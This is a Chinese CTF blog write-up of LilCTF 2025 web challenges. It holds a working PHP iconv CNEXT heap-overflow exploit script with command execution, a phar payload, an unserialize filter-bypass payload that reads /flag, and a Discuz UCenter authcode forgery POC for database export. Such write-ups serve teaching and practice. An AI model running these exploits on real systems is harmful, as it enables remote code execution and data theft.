start: int 26 stop: int 27 permissions: str 28 path: str 29 30 @property 31 def size(self) -\u003e int: 32 return self.stop - self.start 33 34# 获取 /proc/self/maps 35def get_maps(): 36 data = '/maps' 37 r = requests.get(url+data).text 38 return r 39 40# 获取 libc 41def download_file(get_file , local_path): 42 data = '/libc' 43 r = requests.get(url + data,stream=True) 44 data = r.content 45 open(local_path,'wb').write(data) 46 # Path(local_path).write(data) 47 48def get_regions(): 49 maps = get_maps() 50 # maps = maps.decode() 51 PATTERN = re.compile( 52 r\"^([a-f0-9]+)-([a-f0-9]+)\\b\" r\".*\" r\"\\s([-rwx]{3}[ps])\\s\" r\"(.*)\" 53 ) 54 regions = [] 55 for region in table.split(maps, strip=True): 56 if match := PATTERN.match(region): 57 start = int(match.group(1), 16) 58 stop = int(match.group(2), 16) 59 permissions = match.group(3) 60 path = match.group(4) 61 if \"/\" in path or \"[\" in path: 62 path = path.rsplit(\" \", 1)[-1] 63 else: 64 path = \"\" 65 current = Region(start, stop, permissions, path) 66 regions.append(current) 67 else: 68 print(maps) 69 # failure(\"Unable to parse memory mappings\") 70 71 # self.log.info(f\"Got {len(regions)} memory regions\") 72 73 return regions 74 75# 通过 /proc/self/maps 得到 堆地址 76def find_main_heap(regions: list[Region]) -\u003e Region: 77 # Any anonymous RW region with a size superior to the base heap size is a 78 # candidate. The heap is at the bottom of the region. 79 heaps = [ 80 region.stop - HEAP_SIZE + 0x40 81 for region in reversed(regions) 82 if region.permissions == \"rw-p\" 83 and region.size \u003e= HEAP_SIZE 84 and region.stop \u0026 (HEAP_SIZE - 1) == 0 85 and region.path == \"\" 86 ] 87 88 if not heaps: 89 failure(\"Unable to find PHP's main heap in memory\") 90 91 first = heaps[0] 92 93 if len(heaps) \u003e 1: 94 heaps = \", \".join(map(hex, heaps)) 95 msg_info(f\"Potential heaps: [i]{heaps}[/] (using first)\") 96 else: 97 msg_info(f\"Using [i]{hex(first)}[/] as heap\") 98 99 return first 100 101def _get_region(regions: list[Region], *names: str) -\u003e Region: 102 \"\"\"Returns the first region whose name matches one of the given names.\"\"\" 103 for region in regions: 104 if any(name in region.path for name in names): 105 break 106 else: 107 failure(\"Unable to locate region\") 108 109 return region 110 111# 下载 libc 文件 112def get_symbols_and_addresses(): 113 regions = get_regions() 114 LIBC_FILE = \"/dev/shm/cnext-libc\" 115 116 # PHP's heap 117 118 info[\"heap\"] = heap or find_main_heap(regions) 119 120 # Libc 121 122 libc = _get_region(regions, \"libc-\", \"libc.so\") 123 124 download_file(libc.path, LIBC_FILE) 125 126 info[\"libc\"] = ELF(LIBC_FILE, checksec=False) 127 info[\"libc\"].address = libc.start 128 129def compress(data) -\u003e bytes: 130 \"\"\"Returns data suitable for `zlib.inflate`. 131 \"\"\" 132 # Remove 2-byte header and 4-byte checksum 133 return zlib.compress(data, 9)[2:-4] 134 135def b64(data: bytes, misalign=True) -\u003e bytes: 136 payload = b64encode(data) 137 if not misalign and payload.endswith(\"=\"): 138 raise ValueError(f\"Misaligned: {data}\") 139 return payload 140 141def compressed_bucket(data: bytes) -\u003e bytes: 142 \"\"\"Returns a chunk of size 0x8000 that, when dechunked, returns the data.\"\"\" 143 return chunked_chunk(data, 0x8000) 144 145def qpe(data: bytes) -\u003e bytes: 146 \"\"\"Emulates quoted-printable-encode. 147 \"\"\" 148 return \"\".join(f\"={x:02x}\" for x in data).upper().encode() 149 150def ptr_bucket(*ptrs, size=None) -\u003e bytes: 151 \"\"\"Creates a 0x8000 chunk that reveals pointers after every step has been ran.\"\"\" 152 if size is not None: 153 assert len(ptrs) * 8 == size 154 bucket = b\"\".join(map(p64, ptrs)) 155 bucket = qpe(bucket) 156 bucket = chunked_chunk(bucket) 157 bucket = chunked_chunk(bucket) 158 bucket = chunked_chunk(bucket) 159 bucket = compressed_bucket(bucket) 160 161 return bucket 162 163def chunked_chunk(data: bytes, size: int = None) -\u003e bytes: 164 \"\"\"Constructs a chunked representation of the given chunk. If size is given, the 165 chunked representation has size `size`. 166 For instance, `ABCD` with size 10 becomes: `0004\\nABCD\\n`. 167 \"\"\" 168 # The caller does not care about the size: let's just add 8, which is more than 169 # enough 170 if size is None: 171 size = len(data) + 8 172 keep = len(data) + len(b\"\\n\\n\") 173 size = f\"{len(data):x}\".rjust(size - keep, \"0\") 174 return size.encode() + b\"\\n\" + data + b\"\\n\" 175 176# 攻击 payload 的生成 177def build_exploit_path() -\u003e str: 178 LIBC = info[\"libc\"] 179 ADDR_EMALLOC = LIBC.symbols[\"__libc_malloc\"] 180 ADDR_EFREE = LIBC.symbols[\"__libc_system\"] 181 ADDR_EREALLOC = LIBC.symbols[\"__libc_realloc\"] 182 183 ADDR_HEAP = info[\"heap\"] 184 ADDR_FREE_SLOT = ADDR_HEAP + 0x20 185 ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168 186 187 ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10 188 189 CS = 0x100 190 191 # Pad needs to stay at size 0x100 at every step 192 pad_size = CS - 0x18 193 pad = b\"\\x00\" * pad_size 194 pad = chunked_chunk(pad, len(pad) + 6) 195 pad = chunked_chunk(pad, len(pad) + 6) 196 pad = chunked_chunk(pad, len(pad) + 6) 197 pad = compressed_bucket(pad) 198 199 step1_size = 1 200 step1 = b\"\\x00\" * step1_size 201 step1 = chunked_chunk(step1) 202 step1 = chunked_chunk(step1) 203 step1 = chunked_chunk(step1, CS) 204 step1 = compressed_bucket(step1) 205 206 # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to 207 # ISO-2022-CN-EXT. We add a `0\\n` that makes the 4th and last dechunk \"crash\" 208 209 step2_size = 0x48 210 step2 = b\"\\x00\" * (step2_size + 8) 211 step2 = chunked_chunk(step2, CS) 212 step2 = chunked_chunk(step2) 213 step2 = compressed_bucket(step2) 214 215 step2_write_ptr = b\"0\\n\".ljust(step2_size, b\"\\x00\") + p64(ADDR_FAKE_BIN) 216 step2_write_ptr = chunked_chunk(step2_write_ptr, CS) 217 step2_write_ptr = chunked_chunk(step2_write_ptr) 218 step2_write_ptr = compressed_bucket(step2_write_ptr) 219 220 step3_size = CS 221 222 step3 = b\"\\x00\" * step3_size 223 assert len(step3) == CS 224 step3 = chunked_chunk(step3) 225 step3 = chunked_chunk(step3) 226 step3 = chunked_chunk(step3) 227 step3 = compressed_bucket(step3) 228 229 step3_overflow = b\"\\x00\" * (step3_size - len(BUG)) + BUG 230 assert len(step3_overflow) == CS 231 step3_overflow = chunked_chunk(step3_overflow) 232 step3_overflow = chunked_chunk(step3_overflow) 233 step3_overflow = chunked_chunk(step3_overflow) 234 step3_overflow = compressed_bucket(step3_overflow) 235 236 step4_size = CS 237 step4 = b\"=00\" + b\"\\x00\" * (step4_size - 1) 238 step4 = chunked_chunk(step4) 239 step4 = chunked_chunk(step4) 240 step4 = chunked_chunk(step4) 241 step4 = compressed_bucket(step4) 242 243 # This chunk will eventually overwrite mm_heap-\u003efree_slot 244 # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values 245 step4_pwn = ptr_bucket( 246 0x200000, 247 0, 248 # free_slot 249 0, 250 0, 251 ADDR_CUSTOM_HEAP, # 0x18 252 0, 253 0, 254 0, 255 0, 256 0, 257 0, 258 0, 259 0, 260 0, 261 0, 262 0, 263 0, 264 0, 265 ADDR_HEAP, # 0x140 266 0, 267 0, 268 0, 269 0, 270 0, 271 0, 272 0, 273 0, 274 0, 275 0, 276 0, 277 0, 278 0, 279 size=CS, 280 ) 281 282 step4_custom_heap = ptr_bucket( 283 ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18 284 ) 285 286 step4_use_custom_heap_size = 0x140 287 288 COMMAND = command 289 COMMAND = f\"kill -9 $PPID; {COMMAND}\" 290 if sleep: 291 COMMAND = f\"sleep {sleep}; {COMMAND}\" 292 COMMAND = COMMAND.encode() + b\"\\x00\" 293 294 assert ( 295 len(COMMAND) \u003c= step4_use_custom_heap_size 296 ), f\"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}\" 297 COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b\"\\x00\") 298 299 step4_use_custom_heap = COMMAND 300 step4_use_custom_heap = qpe(step4_use_custom_heap) 301 step4_use_custom_heap = chunked_chunk(step4_use_custom_heap) 302 step4_use_custom_heap = chunked_chunk(step4_use_custom_heap) 303 step4_use_custom_heap = chunked_chunk(step4_use_custom_heap) 304 step4_use_custom_heap = compressed_bucket(step4_use_custom_heap) 305 306 pages = ( 307 step4 * 3 308 + step4_pwn 309 + step4_custom_heap 310 + step4_use_custom_heap 311 + step3_overflow 312 + pad * PAD 313 + step1 * 3 314 + step2_write_ptr 315 + step2 * 2 316 ) 317 318 resource = compress(compress(pages)) 319 resource = b64(resource) 320 resource = f\"data:text/plain;base64,{resource.decode()}\" 321 322 filters = [ 323 # Create buckets 324 \"zlib.inflate\", 325 \"zlib.inflate\", 326 327 # Step 0: Setup heap 328 \"dechunk\", 329 \"convert.iconv.latin1.latin1\", 330 331 # Step 1: Reverse FL order 332 \"dechunk\", 333 \"convert.iconv.latin1.latin1\", 334 335 # Step 2: Put fake pointer and make FL order back to normal 336 \"dechunk\", 337 \"convert.iconv.latin1.latin1\", 338 339 # Step 3: Trigger overflow 340 \"dechunk\", 341 \"convert.iconv.UTF-8.ISO-2022-CN-EXT\", 342 343 # Step 4: Allocate at arbitrary address and change zend_mm_heap 344 \"convert.quoted-printable-decode\", 345 \"convert.iconv.latin1.latin1\", 346 ] 347 filters = \"|\".join(filters) 348 path = f\"php://filter/read={filters}/resource={resource}\" 349 # print(path) 350 return path 351 352def exploit() -\u003e None: 353 path = build_exploit_path() 354 start = time.time() 355 print(path) 356 357get_symbols_and_addresses() 358print(info) 359exploit() 一开始想着直接include打就行了，但是发现不行，在这里卡了很久。找了一圈看看有没有其他能打cnext的函数，太菜了没找到，所以又回到include了。\n环境没开报错，所以本地开个环境看看怎么回事。可以看到由于allow_url_include为Off，所以include里面没办法使用data://\n那这样就好办了，我们不用data://就好了，data在这个payload里面的作用是base64解码，那我们直接用php://filter解码不就好了。我们可以直接把base64的内容写到文件中，接着用php://filter读取并解码\n最终Payload\n1\u003c?php 2$phar = new Phar('exploit.phar'); 3$phar-\u003estartBuffering(); 4 5$stub = \u003c\u003c\u003c 'STUB' 6\u003c?php 7 file_put_contents(\"/tmp/base\",\"e3vXsO+NiwDbg77XJm8l3/eoFzDYhCk95hLbst6xicNClfP7glt/ORo4MidWvHof/FL/+7r0Y/OyfF9FMTLgBTMObZIp3Hr76quIq9Fvtk7b6brJEb8GBrWNOu4xb8u2WoV9Fatem5o3MUcAv4YGT53TguG7Y9f2he49Gpc9M1pFmgW/jmVF8dt2RO2Nkl0d9Vv4QfXdV8+b+dev37ZX7/f20vtyv3/dmv/+/1V236DXU/ed51/lUSdHwMk/9ldfefE2Vzp3zTXdb+l35c//vbwtf31t7dvz3/dei4tPvfvd//v+/3vn//93/rPyz2n4g+xB/M7/FbYNf/49/srw6Td/8lfn3r+V9+Xvv+nfHnd+1/1XdfHffl//++Dj138Vsf//LtPPn//t92uriO/bb2XXvn396+eT27//7Yl9v/lNf2m9zTpxvb+Kz//a7v/7eY77/+R5N/vnz9ful7/970x47S6713/19c9/l+93CPf6u1XpZyUzgbg8timncGsVMGa2us28+X7/P5mT3wiETIJF/4kI46jXG11nuqh8Zh9VPKp4VDGdFc+4F5R9pmT36R23r2d4T/HYRqDEPvBlWlTystuxx+7uc4te5LKJl0AWX7b9ipTx3XdG776Z3hJSnZRLQLnB2qV5hVul4i+l7n/61O2nwP3p9+t+vlsepHSojIDOGdeCtu+I6tV/uel+1hR+McFtBIqrA1um7Tp6NavGc/rfsMU1Gzp+MAMA\"); 8 include(\"php://filter/read=convert.base64-decode|zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=/tmp/base\"); 9 __HALT_COMPILER(); 10?\u003e 11STUB; 12 13$phar-\u003esetStub($stub); 14 15$phar-\u003eaddFromString('test.txt', 'test'); 16 17$phar-\u003estopBuffering(); 18?\u003e 拿到flag\nYour Uns3r 题目\n1\u003c?php 2highlight_file(__FILE__); 3class User 4{ 5 public $username; 6 public $value; 7 public function exec() 8 { 9 $ser = unserialize(serialize(unserialize($this-\u003evalue))); 10 if ($ser != $this-\u003evalue \u0026\u0026 $ser instanceof Access) { 11 include($ser-\u003egetToken()); 12 } 13 } 14 public function __destruct() 15 { 16 if ($this-\u003eusername == \"admin\") { 17 $this-\u003eexec(); 18 } 19 } 20} 21 22class Access 23{ 24 protected $prefix; 25 protected $suffix; 26 27 public function getToken() 28 { 29 if (!is_string($this-\u003eprefix) || !is_string($this-\u003esuffix)) { 30 throw new Exception(\"Go to HELL!\"); 31 } 32 $result = $this-\u003eprefix . 'lilctf' . $this-\u003esuffix; 33 if (strpos($result, 'pearcmd') !== false) { 34 throw new Exception(\"Can I have peachcmd?\"); 35 } 36 return $result; 37 38 } 39} 40 41$ser = $_POST[\"user\"]; 42if (strpos($ser, 'admin') !== false \u0026\u0026 strpos($ser, 'Access\":') !== false) { 43 exit (\"no way!!!!\"); 44} 45 46$user = unserialize($ser); 47throw new Exception(\"nonono!!!\"); EXP\n1\u003c?php 2// highlight_file(__FILE__); 3class User 4{ 5 public $username; 6 public $value; 7} 8 9class Access 10{ 11 protected $prefix = 'php://filter/read=convert.base64-encode/resource='; 12 protected $suffix = '/../../../../../flag'; 13 14} 15 16$exp = new User(); 17$exp -\u003e username = 'admin'; 18$access = new Access(); 19$exp -\u003e value = serialize($access); 20 21$exp = serialize($exp); 22$exp = str_replace(\"s:5:\\\"admin\",\"S:5:\\\"admi\\\\6e\",$exp); 23$exp = str_replace(\"Access\",\"ACcess\",$exp); 24 25echo urlencode($exp); 26 27//O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3BS%3A5%3A%22admi%5C6e%22%3Bs%3A5%3A%22value%22%3Bs%3A134%3A%22O%3A6%3A%22ACcess%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A49%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A20%3A%22%2F..%2F..%2F..%2F..%2F..%2Fflag%22%3B%7D%22%3B%7D 类名可以用大小写绕过，变量名可以用hex绕过\n最后删除最后一个括号来绕过gc回收\nPayload\n1user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3BS%3A5%3A%22admi%5C6e%22%3Bs%3A5%3A%22value%22%3Bs%3A134%3A%22O%3A6%3A%22ACcess%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A49%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A20%3A%22%2F..%2F..%2F..%2F..%2F..%2Fflag%22%3B%7D%22%3B 我曾有一份工作 扫目录扫到 /www.zip\n拿到源码之后先用Seay扫一下可能存在风险的位置\n想着先找前台洞，所以先找没有鉴权的\n看到这个/uc_server/api/dbbak.php，想起来题目提到数据库和备份，感觉应该是找对了\n这是一个数据库备份的脚本，可以对数据库进行导入导出之类的操作，题目说flag在pre_a_flag 表，那我们只需要把数据库导出来就好了，看看流程。\n首先接受两个传参，code和apptype\n接着会根据apptype导入不同的配置文件，配置文件里面会有数据库连接信息，密钥等信息\n而code会通过_authcode函数进行解密，解出数组get。然后判断数据get是否为空且里面的time是否在一小时之内\n根据不同的apptype连接不同的数据库，并根据get数组里面的method进行对应的操作，我们这里只需要export导出数据库就行了\n流程走完，写个脚本生成一下code\nPOC\n1import base64 2import hashlib 3import time 4import urllib.parse 5 6UC_KEY = \"N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb\" 7TARGET = \"http://challenge.xinshi.fun:31430/uc_server/api/dbbak.php?apptype=discuzx\u0026\" 8 9def authcode(string, operation='DECODE', key=UC_KEY, expiry=0): 10 ckey_length = 4 11 key = hashlib.md5(key.encode()).hexdigest() 12 keya = hashlib.md5(key[:16].encode()).hexdigest() 13 keyb = hashlib.md5(key[16:].encode()).hexdigest() 14 if ckey_length: 15 if operation == 'DECODE': 16 keyc = string[:ckey_length] 17 else: 18 keyc = hashlib.md5(str(time.time()).encode()).hexdigest()[-ckey_length:] 19 else: 20 keyc = '' 21 cryptkey = keya + hashlib.md5((keya + keyc).encode()).hexdigest() 22 key_length = len(cryptkey) 23 24 if operation == 'DECODE': 25 string = base64.b64decode(string[ckey_length:].encode()) 26 else: 27 expiry_time = expiry + int(time.time()) if expiry else 0 28 string = ('%010d' % expiry_time).encode() + \\ 29 hashlib.md5((string + keyb).encode()).hexdigest()[:16].encode() + \\ 30 string.encode() 31 32 box = list(range(256)) 33 rndkey = [ord(cryptkey[i % key_length]) for i in range(256)] 34 j = 0 35 for i in range(256): 36 j = (j + box[i] + rndkey[i]) % 256 37 box[i], box[j] = box[j], box[i] 38 39 result = bytearray() 40 a = j = 0 41 for byte in string: 42 a = (a + 1) % 256 43 j = (j + box[a]) % 256 44 box[a], box[j] = box[j], box[a] 45 result.append(byte ^ box[(box[a] + box[j]) % 256]) 46 47 if operation == 'DECODE': 48 result = result.decode(errors='ignore') 49 if (len(result) \u003e 26 and 50 (int(result[:10]) == 0 or int(result[:10]) - int(time.time()) \u003e 0) and 51 result[10:26] == hashlib.md5((result[26:] + keyb).encode()).hexdigest()[:16]): 52 return result[26:] 53 else: 54 return '' 55 else: 56 return keyc + base64.b64encode(result).decode().replace('=', '') 57 58 59def build_code(params: dict, expiry=3600) -\u003e str: 60 # 构造 query string 61 query = urllib.parse.urlencode(params, doseq=True) 62 return authcode(query, 'ENCODE', UC_KEY, expiry) 63 64 65if __name__ == \"__main__\": 66 # 构造 payload 67 payload = { 68 \"method\": \"export\", 69 \"time\": int(time.time()) 70 } 71 72 # 生成 code，有效期 1 小时 73 code = build_code(payload, expiry=3600) 74 print(\"[*] code =\", code) 75 76 # 拼接最终 URL 77 url = f\"{TARGET}code={urllib.parse.quote(code)}\" 78 print(\"[*] Final URL:\\n\", url) 下载导出的数据库\n找到hex的flag\n",
  "wordCount" : "6006",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-08-18T18:53:55+08:00",
  "dateModified": "2025-08-18T18:53:55+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://blog.xrntkk.top/post/lilctf_2025/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://blog.xrntkk.top/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://blog.xrntkk.top/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://blog.xrntkk.top/" title="Xrntkk&#39;s Blog">
                    <span>首页📔</span>
                </a>
            </li>
            <li>
                <a href="https://blog.xrntkk.top/archives/" title="归档">
                    <span>归档🗃️</span>
                </a>
            </li>
            <li>
                <a href="https://blog.xrntkk.top/tags/" title="Tags">
                    <span>标签🔖</span>
                </a>
            </li>
            <li>
                <a href="https://blog.xrntkk.top/search/" title="搜索">
                    <span>搜索🔎</span>
                </a>
            </li>
            <li>
                <a href="https://blog.xrntkk.top/links/" title="友链🎈">
                    <span>友链🎈</span>
                </a>
            </li>
            <li>
                <a href="https://blog.xrntkk.top/about/" title="关于">
                    <span>关于👨‍💻</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      LilCTF-2025-Web-Writeup
    </h1>
<div class="post-meta"><span title='2025-08-18 18:53:55 +0800 CST'>2025-08-18</span>&nbsp;·&nbsp;<span>12 分钟</span>&nbsp;·&nbsp;<span>Xrntkk</span>

<div class="meta-item">&nbsp·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#ez_bottle" aria-label="ez_bottle">ez_bottle</a></li>
                <li>
                    <a href="#ekko_note" aria-label="Ekko_note">Ekko_note</a></li>
                <li>
                    <a href="#php_jail_is_my_cry" aria-label="php_jail_is_my_cry">php_jail_is_my_cry</a></li>
                <li>
                    <a href="#your-uns3r" aria-label="Your Uns3r">Your Uns3r</a></li>
                <li>
                    <a href="#%e6%88%91%e6%9b%be%e6%9c%89%e4%b8%80%e4%bb%bd%e5%b7%a5%e4%bd%9c" aria-label="我曾有一份工作">我曾有一份工作</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>这次我们第二名，大家太强了，彦门万岁！</p>
<p><img alt="image-20250818210146577" loading="lazy" src="../assets/image-20250818210146577.png"></p>
<p>这里是我个人的wp，这次Web我做了5题，所以这里就只写我自己做的题目。</p>
<h2 id="ez_bottle">ez_bottle<a hidden class="anchor" aria-hidden="true" href="#ez_bottle">#</a></h2>
<p>关键代码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nd">@post</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="n">zip_file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">zip_file</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">zip_file</span><span class="o">.</span><span class="n">filename</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;.zip&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Invalid file. Please upload a ZIP file.&#39;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">zip_file</span><span class="o">.</span><span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">())</span> <span class="o">&gt;</span> <span class="n">MAX_FILE_SIZE</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="k">return</span> <span class="s1">&#39;File size exceeds 1MB. Please upload a smaller ZIP file.&#39;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">zip_file</span><span class="o">.</span><span class="n">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">current_time</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">unique_string</span> <span class="o">=</span> <span class="n">zip_file</span><span class="o">.</span><span class="n">filename</span> <span class="o">+</span> <span class="n">current_time</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">md5_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">unique_string</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="n">extract_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">,</span> <span class="n">md5_hash</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">zip_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">,</span> <span class="s1">&#39;upload.zip&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="n">zip_file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">zip_path</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">z</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="k">for</span> <span class="n">file_info</span> <span class="ow">in</span> <span class="n">z</span><span class="o">.</span><span class="n">infolist</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">                <span class="k">if</span> <span class="n">is_symlink</span><span class="p">(</span><span class="n">file_info</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">                    <span class="k">return</span> <span class="s1">&#39;Symbolic links are not allowed.&#39;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">                <span class="n">real_dest_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">,</span> <span class="n">file_info</span><span class="o">.</span><span class="n">filename</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="n">is_safe_path</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">,</span> <span class="n">real_dest_path</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">                    <span class="k">return</span> <span class="s1">&#39;Path traversal detected.&#39;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="n">z</span><span class="o">.</span><span class="n">extractall</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="k">except</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">BadZipFile</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Invalid ZIP file.&#39;</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">extract_dir</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="n">files</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s1">&#39;upload.zip&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
